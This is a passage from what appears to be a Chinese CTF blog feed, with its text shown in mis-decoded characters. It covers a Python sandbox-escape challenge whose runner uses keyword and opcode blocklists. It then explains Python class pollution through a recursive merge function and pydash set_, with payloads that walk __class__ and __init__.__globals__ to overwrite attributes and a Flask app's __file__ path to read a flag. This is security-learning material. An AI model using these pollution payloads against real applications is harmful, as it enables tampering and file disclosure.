class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>):</span><br><span class="line">            os.remove(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;</span><br><span class="line">            <span class="string">&quot;result&quot;</span>: <span class="string">&quot;None&quot;</span></span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>â€‹æ²¡å•¥å¤ªå¤§å¾—åˆ°ç”¨å¤„ï¼Œå¤§æ¦‚å°±æ˜¯æ¯ä¸€æ¬¡è®¿é—® <code>/run</code> <span class="exturl" data-url="aHR0cDovL3huLS11dWlkLWs4NGZ1aXQxMWd0eGt1eTViZGZheDAwei5weQ=="> è·¯ç”±å°±ç”Ÿæˆä¸€ä¸ª uuid.py</span>ï¼Œå°† flag æ›¿æ¢è¿›æ–‡ä»¶å ä½ç¬¦ï¼Œä¹‹åï¼Œå†ç”Ÿæˆä¸€ä¸ª uuid.txt æ–‡ä»¶ï¼Œå°†ç”¨æˆ·ä¸Šä¼ çš„ä»£ç å†™å…¥ï¼Œä¹‹åè¿è¡Œä»£ç ï¼Œå¹¶ç»“æœè¿”å›ã€‚</p><p>â€‹<span class="exturl" data-url="aHR0cDovL3huLS1ydW5uZXItOTE3aWs3MGJpbTNmYS5weQ==">ä¹‹åçœ‹çœ‹ runner.py</span>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">source_simple_check</span>(<span class="params">source</span>):</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Check the source with pure string in string, prevent dangerous strings</span></span><br><span class="line"><span class="string">    :param source: source code</span></span><br><span class="line"><span class="string">    :return: None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> sys <span class="keyword">import</span> exit</span><br><span class="line">    <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">print</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        source.encode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> UnicodeEncodeError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;non-ascii is not permitted&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="string">&quot;__&quot;</span>, <span class="string">&quot;getattr&quot;</span>, <span class="string">&quot;exit&quot;</span>]:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> source.lower():</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">block_wrapper</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Check the run process with sys.audithook, no dangerous operations should be conduct</span></span><br><span class="line"><span class="string">    :return: None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">audit</span>(<span class="params">event, args</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">str</span>, <span class="built_in">print</span></span><br><span class="line">        <span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="string">&quot;marshal&quot;</span>, <span class="string">&quot;__new__&quot;</span>, <span class="string">&quot;process&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;sys&quot;</span>, <span class="string">&quot;interpreter&quot;</span>, <span class="string">&quot;cpython&quot;</span>, <span class="string">&quot;open&quot;</span>, <span class="string">&quot;compile&quot;</span>, <span class="string">&quot;gc&quot;</span>]:</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> (event + <span class="string">&quot;&quot;</span>.join(<span class="built_in">str</span>(s) <span class="keyword">for</span> s <span class="keyword">in</span> args)).lower():</span><br><span class="line">                <span class="built_in">print</span>(i)</span><br><span class="line">                os._exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> audit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source_opcode_checker</span>(<span class="params">code</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Check the source in the bytecode aspect, no methods and globals should be load</span></span><br><span class="line"><span class="string">    :param code: source code</span></span><br><span class="line"><span class="string">    :return: None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> dis <span class="keyword">import</span> dis</span><br><span class="line">    <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">str</span></span><br><span class="line">    <span class="keyword">from</span> io <span class="keyword">import</span> StringIO</span><br><span class="line">    <span class="keyword">from</span> sys <span class="keyword">import</span> exit</span><br><span class="line"></span><br><span class="line">    opcodeIO = StringIO()</span><br><span class="line">    dis(code, file=opcodeIO)</span><br><span class="line">    opcode = opcodeIO.getvalue().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    opcodeIO.close()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> opcode:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">any</span>(x <span class="keyword">in</span> <span class="built_in">str</span>(line) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">&quot;LOAD_GLOBAL&quot;</span>, <span class="string">&quot;IMPORT_NAME&quot;</span>, <span class="string">&quot;LOAD_METHOD&quot;</span>]):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">any</span>(x <span class="keyword">in</span> <span class="built_in">str</span>(line) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">&quot;randint&quot;</span>, <span class="string">&quot;randrange&quot;</span>, <span class="string">&quot;print&quot;</span>, <span class="string">&quot;seed&quot;</span>]):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join([x <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">&quot;LOAD_GLOBAL&quot;</span>, <span class="string">&quot;IMPORT_NAME&quot;</span>, <span class="string">&quot;LOAD_METHOD&quot;</span>] <span class="keyword">if</span> x <span class="keyword">in</span> <span class="built_in">str</span>(line)]))</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">open</span></span><br><span class="line">    <span class="keyword">from</span> sys <span class="keyword">import</span> addaudithook</span><br><span class="line">    <span class="keyword">from</span> contextlib <span class="keyword">import</span> redirect_stdout</span><br><span class="line">    <span class="keyword">from</span> random <span class="keyword">import</span> randint, randrange, seed</span><br><span class="line">    <span class="keyword">from</span> io <span class="keyword">import</span> StringIO</span><br><span class="line">    <span class="keyword">from</span> random <span class="keyword">import</span> seed</span><br><span class="line">    <span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">    source = <span class="built_in">open</span>(<span class="string">f&quot;/app/uploads/THIS_IS_TASK_RANDOM_ID.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line">    source_simple_check(source)</span><br><span class="line">    source_opcode_checker(source)</span><br><span class="line">    code = <span class="built_in">compile</span>(source, <span class="string">&quot;&lt;sandbox&gt;&quot;</span>, <span class="string">&quot;exec&quot;</span>)</span><br><span class="line">    addaudithook(block_wrapper())</span><br><span class="line">    outputIO = StringIO()</span><br><span class="line">    <span class="keyword">with</span> redirect_stdout(outputIO):</span><br><span class="line">        seed(<span class="built_in">str</span>(time()) + <span class="string">&quot;THIS_IS_SEED&quot;</span> + <span class="built_in">str</span>(time()))</span><br><span class="line">        <span class="built_in">exec</span>(code, &#123;</span><br><span class="line">            <span class="string">&quot;__builtins__&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;randint&quot;</span>: randint,</span><br><span class="line">            <span class="string">&quot;randrange&quot;</span>: randrange,</span><br><span class="line">            <span class="string">&quot;seed&quot;</span>: seed,</span><br><span class="line">            <span class="string">&quot;print&quot;</span>: <span class="built_in">print</span></span><br><span class="line">        &#125;, <span class="literal">None</span>)</span><br><span class="line">    output = outputIO.getvalue()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;THIS_IS_SEED&quot;</span> <span class="keyword">in</span> output:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;è¿™ runtime ä½ å°±å˜å˜å†™å§ï¼Œ ä¸€å†™ä¸€ä¸ªä¸å±å£°å•Šï¼Œç‚¹å„¿éƒ½æ²¡æ‹¦ä½ï¼&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;bad code-operation why still happened ah?&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(output)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>â€‹é¦–å…ˆæ˜¯ <code>source_simple_check()</code>  å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ç®€å•æ¥è¯´å°±æ˜¯ç»™ æ‰€æœ‰å…¨è§’å­—ç¬¦éƒ½ ban äº†ï¼Œæ— æ³•ä½¿ç”¨ï¼Œä»¥åŠä¸‰ä¸ªå…³é”®å­—ï¼Œä¹Ÿç»™ ban äº†ã€‚</p><p>â€‹ä¹‹åæ˜¯ <code>block_wrapper()</code> ï¼Œæ£€æµ‹ä»£ç æ‰§è¡Œè¿‡ç¨‹ä¸­äº‹ä»¶å’Œå‚æ•°æ˜¯å¦å«æœ‰é‚£äº›å…³é”®å­— ã€‚</p><p>â€‹ä¹‹åæ˜¯ <code>source_opcode_checker()</code> ï¼Œç›®çš„ä¸ºæ£€æµ‹ç”¨æˆ·ç¨‹åºçš„æ“ä½œç ä¸­æ˜¯å¦å«æœ‰è®¿é—®å…¨å±€å˜é‡ã€å¯¼å…¥æ¨¡å—ä»¥åŠæ–¹æ³•ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;pythonæ ˆå¸§é€ƒé€¸&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#pythonæ ˆå¸§é€ƒé€¸&quot;&gt;#&lt;/a&gt; Python æ ˆå¸§é€ƒé€¸ï¼š&lt;/h1&gt;
&lt;h2 id=&quot;1-yield-è¯­ä¸ç”Ÿæˆå™¨å‡½æ•°&quot;&gt;&lt;a class=&quot;markdownIt-An</summary>
      
    
    
    
    <category term="Webç‹—çš„è‡ªæˆ‘å®‰æ…°" scheme="http://blog.g01den.top/categories/Web/"/>
    
    
    <category term="Web" scheme="http://blog.g01den.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>pythonåŸå‹é“¾æ±¡æŸ“</title>
    <link href="http://blog.g01den.top/posts/ff5b88d5.html"/>
    <id>http://blog.g01den.top/posts/ff5b88d5.html</id>
    <published>2026-02-01T20:48:16.000Z</published>
    <updated>2026-02-05T09:54:54.648Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pythonåŸå‹é“¾æ±¡æŸ“"><a class="markdownIt-Anchor" href="#pythonåŸå‹é“¾æ±¡æŸ“">#</a> python åŸå‹é“¾æ±¡æŸ“</h1><p>â€‹åé¢ä¼šæœ‰è·Ÿç€ Article_kelp æ…¢æ…¢æ“ä½œçš„ï¼Œå‰é¢å…ˆé¢å‘é¢˜ç›®å­¦ä¹ ã€‚</p><h2 id="èƒŒæ™¯"><a class="markdownIt-Anchor" href="#èƒŒæ™¯">#</a> èƒŒæ™¯ï¼š</h2><p>â€‹å›½èµ›é‡åˆ°äº†è¿™ä¸ªè€ƒç‚¹ï¼Œç„¶åä¹‹åçš„ DASCTF å¤å­£æŒ‘æˆ˜èµ›ä¹Ÿç¢°åˆ°äº†ï¼ŒæŠ“ç´§ç²—ç•¥å­¦ä¸€æ‰‹ï¼Œå­¦äº† JavaScript ä¹‹åå†æ·±ç©¶åŸå‹é“¾æ±¡æŸ“ã€‚</p><h2 id="ç®€ä»‹"><a class="markdownIt-Anchor" href="#ç®€ä»‹">#</a> ç®€ä»‹ï¼š</h2><p>â€‹python ä¸­çš„åŸå‹é“¾æ±¡æŸ“æ˜¯æŒ‡é€šè¿‡ä¿®æ”¹å¯¹è±¡åŸå‹é“¾ä¸­çš„å±æ€§ï¼Œå¯¹ç¨‹åºçš„è¡Œä¸ºäº§ç”Ÿä»¥å¤–å½±å“æˆ–åˆ©ç”¨æ¼æ´è¿›è¡Œæ”»å‡»çš„ä¸€ç§æŠ€æœ¯ã€‚</p><p>â€‹åœ¨ Python ä¸­ï¼Œå¯¹è±¡çš„å±æ€§å’Œæ–¹æ³•å¯ä»¥é€šè¿‡åŸå‹é“¾ç»§æ‰¿æ¥è·å–ã€‚æ¯ä¸ªå¯¹è±¡éƒ½æœ‰ä¸€ä¸ªåŸå‹ï¼ŒåŸå‹ä¸Šå®šä¹‰äº†å¯¹è±¡å¯ä»¥è®¿é—®çš„å±æ€§å’Œæ–¹æ³•ã€‚å½“å¯¹è±¡è®¿é—®å±æ€§æˆ–æ–¹æ³•æ—¶ï¼Œä¼šå…ˆåœ¨è‡ªèº«æŸ¥æ‰¾ï¼Œå¦‚æœæ‰¾ä¸åˆ°å°±ä¼šå»åŸå‹é“¾ä¸Šçš„ä¸Šçº§å¯¹è±¡ä¸­æŸ¥æ‰¾ï¼ŒåŸå‹é“¾æ±¡æŸ“æ”»å‡»çš„æ€è·¯æ˜¯é€šè¿‡ä¿®æ”¹å¯¹è±¡åŸå‹é“¾ä¸­çš„å±æ€§ï¼Œä½¿å¾—ç¨‹åºåœ¨è®¿é—®å±æ€§æˆ–æ–¹æ³•æ—¶å¾—åˆ°ä¸ç¬¦åˆé¢„æœŸçš„ç»“æœã€‚å¸¸è§çš„åŸå‹é“¾æ±¡æŸ“æ”»å‡»åŒ…æ‹¬ä¿®æ”¹å†…ç½®å¯¹è±¡çš„åŸå‹ã€ä¿®æ”¹å…¨å±€å¯¹è±¡çš„åŸå‹ç­‰</p><p>â€‹è¿™ä¸ªçŸ¥è¯†ç‚¹åº”ç”¨çš„èŒƒå›´æ¯”è¾ƒå°ï¼Œä»…å½“é¢˜ç›®ä¸­å‡ºç° <code>utils</code>  çš„ <code>merge</code>  æˆ– <code>Pydash(5.1.2)</code>  æ¨¡å—ä¸­çš„ <code>set</code>  å’Œ <code>set_with</code>  å‡½æ•°æ‰ä¼šç”¨ä¸Šã€‚</p><h2 id="mergeæ²¡é‡åˆ°è¿‡å…·ä½“é¢˜å‹å…ˆç®€å•è¯´ä¸‹"><a class="markdownIt-Anchor" href="#mergeæ²¡é‡åˆ°è¿‡å…·ä½“é¢˜å‹å…ˆç®€å•è¯´ä¸‹">#</a> mergeï¼ˆæ²¡é‡åˆ°è¿‡å…·ä½“é¢˜å‹ï¼Œå…ˆç®€å•è¯´ä¸‹ï¼‰ï¼š</h2><p>â€‹é¦–å…ˆæ˜¯ä¸‹é¢è¿™ä¸ªç¨‹åºï¼Œå¯ä»¥å† merge æ‰“ä¸ªæ–­ç‚¹ï¼Œdebug è¯•è¯•çœ‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>:</span><br><span class="line">    secret = <span class="string">&quot;hello&quot;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_a</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_b</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line">instance = son_b()</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__base__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;secret&quot;</span> : <span class="string">&quot;world&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(son_a.secret)</span><br><span class="line"><span class="comment">#hello</span></span><br><span class="line"><span class="built_in">print</span>(instance.secret)</span><br><span class="line"><span class="comment">#hello</span></span><br><span class="line">merge(payload, instance)</span><br><span class="line"><span class="built_in">print</span>(son_a.secret)</span><br><span class="line"><span class="comment">#world</span></span><br><span class="line"><span class="built_in">print</span>(instance.secret)</span><br><span class="line"><span class="comment">#world</span></span><br><span class="line"><span class="built_in">print</span>(father.secret)</span><br><span class="line"><span class="comment">#world</span></span><br></pre></td></tr></table></figure><p>â€‹è¿™å°±æ˜¯ä¸€ä¸ªç®€å•çš„æ±¡æŸ“ father ç±»çš„ secret å±æ€§çš„ä¸€ä¸ªç¨‹åºï¼Œå¯ä»¥çœ‹åˆ°çš„æ˜¯ï¼Œæœ€å father.secret ç¡®å®æ˜¯è¢«æ±¡æŸ“äº†ã€‚</p><p>â€‹å½“ç„¶ï¼Œå†…ç½®å±æ€§ä¾‹å¦‚ __str__ï¼Œ</p><p>â€‹<strong>ç‰¹åˆ«æ³¨æ„ï¼š</strong></p><p>â€‹å¹¶ä¸æ˜¯æ‰€æœ‰çš„ç±»çš„å±æ€§éƒ½å¯ä»¥è¢«æ±¡æŸ“ï¼Œå¦‚ <code>Object</code>  çš„å±æ€§å°±æ— æ³•è¢«æ±¡æŸ“ï¼Œæ‰€ä»¥éœ€è¦ç›®æ ‡ç±»èƒ½å¤Ÿè¢«åˆ‡å…¥ç‚¹ç±»æˆ–å¯¹è±¡å¯ä»¥é€šè¿‡å±æ€§å€¼æŸ¥æ‰¾è·å–åˆ°</p><blockquote><p><strong>å¤§ä½¬æ˜¯è¿™ä¹ˆè¯´çš„</strong></p><p>é€šè¿‡æ–­ç‚¹è°ƒè¯•å¯ä»¥çœ‹å‡ºè¿™ä¸ª merge å‡½æ•°åœ¨èµ°åˆ° hasattr å¤„ï¼Œç”±äºæˆ‘ä»¬çš„ payload æ˜¯ä¸€å±‚å­—å…¸å¥—ä¸€å±‚å­—å…¸ï¼Œå°±ä¼šé€’å½’è°ƒç”¨ mergeï¼Œå¹¶ä¸”ç”±äº getattr (dst,k)ï¼Œdst å°±åœ¨ä¸€ç›´æŒ‰ç€ payload çš„é”®å‘ç”Ÿå˜åŒ–ï¼Œä»åˆ°ç±»ï¼Œå†åˆ°çˆ¶ç±»ï¼Œæœ€åæŠŠçˆ¶ç±»çš„ secret èµ‹å€¼ä¸º pollutedï¼ŒæˆåŠŸå®ç°äº†åŸå‹é“¾æ±¡æŸ“ã€‚</p><p>payload ä¹Ÿå¾ˆå¥½ç†è§£ï¼Œå…¶å®å°±æ˜¯åˆ©ç”¨äº† python çš„é“¾å¼ç»§æ‰¿å…³ç³»ï¼Œæœ€åæ‰¾åˆ°è¿™ä¸ªç±»å³å¯ï¼Œå’Œ SSTI é€šè¿‡é“¾å¼ç»§æ‰¿å…³ç³»æ‰¾ os æ¨¡å—å¾ˆåƒã€‚</p><p>ç±»çš„å†…ç½®å±æ€§ï¼Œå¦‚ <code>__str__</code> ä¹Ÿå¯ä»¥è¢«æ±¡æŸ“ï¼Œä½†æ˜¯éœ€è¦æ³¨æ„ï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰ç±»çš„å±æ€§éƒ½å¯ä»¥è¢«æ±¡æŸ“ï¼Œæ¯”å¦‚ <code>Object</code>  å°±æ— æ³•è¢«æ±¡æŸ“ã€‚</p></blockquote><h2 id="pydash512"><a class="markdownIt-Anchor" href="#pydash512">#</a> pydash(5.1.2)ï¼š</h2><p>â€‹ç”±äºæš‚æ—¶ä¸ä¼š Sanic æ¡†æ¶çš„ç¼–å†™ï¼Œæ‰€ä»¥å…ˆæš‚æ—¶ç”¨ä¸‹ flask æ¡†æ¶ï¼Œ å·®è·åº”è¯¥ä¸å¤§ã€‚</p><p>â€‹å…ˆçœ‹çœ‹ä¸‹é¢è¿™ä¸ªä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pydash <span class="keyword">import</span> set_</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Father</span>:</span><br><span class="line">    secret_value = <span class="string">&quot;safe&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollution</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">pollutant = Pollution()</span><br><span class="line">father = Father()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;key&quot;</span> : <span class="string">&quot;__class__.__init__.__globals__.father.secret_value&quot;</span>,</span><br><span class="line">    <span class="string">&quot;value&quot;</span> : <span class="string">&quot;polluted&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">key = payload[<span class="string">&quot;key&quot;</span>]</span><br><span class="line">value = payload[<span class="string">&quot;value&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(father.secret_value)</span><br><span class="line"><span class="comment">#safe</span></span><br><span class="line">set_(pollutant,key, value)</span><br><span class="line"><span class="built_in">print</span>(father.secret_value)</span><br><span class="line"><span class="comment">#polluted</span></span><br></pre></td></tr></table></figure><p>â€‹å¦‚ä¸Šï¼Œæˆ‘ä»¬æœ€åæˆåŠŸæ±¡æŸ“äº† Father ç±»çš„ secret_value å±æ€§ï¼Œå¤§æ¦‚æ€è·¯å°±æ˜¯é€šè¿‡ key é‡Œçš„è¿™ä¸ªé“¾å­å»æ‰¾åˆ° father.secret_value è¿™ä¸ªå±æ€§ï¼Œç„¶åè¿›è¡Œæ±¡æŸ“ï¼Œæ±¡æŸ“ä¸º value çš„å€¼ã€‚</p><p>â€‹ä¹Ÿæ­£å› ä¸ºå¦‚æ­¤ï¼Œæ‰€ä»¥å†™ä¸€ä¸ª Web æœåŠ¡æ¥è¯•è¯•çœ‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> pydash <span class="keyword">import</span> set_</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/pollute&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Pollution</span>():</span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">r&quot;key&quot;</span>: <span class="string">r&quot;__init__.__globals__.__file__&quot;</span>,</span><br><span class="line">        <span class="string">r&quot;value&quot;</span>: <span class="string">r&quot;D:\html study\PyCharm Project\flask_pydash1\flag&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    key = payload[<span 